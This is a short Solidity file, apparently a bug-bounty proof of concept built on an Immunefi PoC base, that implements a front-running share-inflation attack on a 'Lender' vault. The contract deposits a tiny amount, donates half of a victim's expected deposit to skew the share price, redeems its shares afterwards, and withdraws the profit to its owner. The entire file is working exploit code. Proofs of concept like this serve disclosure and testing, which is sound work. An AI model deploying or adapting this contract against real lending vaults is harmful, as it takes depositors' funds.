// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/src/PoC.sol";
import "forge-std/interfaces/IERC20.sol";

import "../src/external/Factory/src/Lender.sol";

contract FrontrunContract is PoC {
    Lender immutable lender;
    IERC20 immutable asset; 
    address immutable owner;

    constructor(Lender _lender, IERC20 _asset) {
        lender = _lender;
        asset = _asset;
        owner = msg.sender;
    }

    function frontRun(uint256 victimDeposit) external {
        asset.transfer(address(lender), 2);
        lender.deposit(2, address(this));

        asset.transfer(address(lender), victimDeposit / 2);
    }

    function backRun() external {
        lender.redeem(2, address(this), address(this));
    }

    function withdrawProfits() external {
        require(msg.sender == owner, "Only owner");

        asset.transfer(owner, asset.balanceOf(address(this)));
    }
}
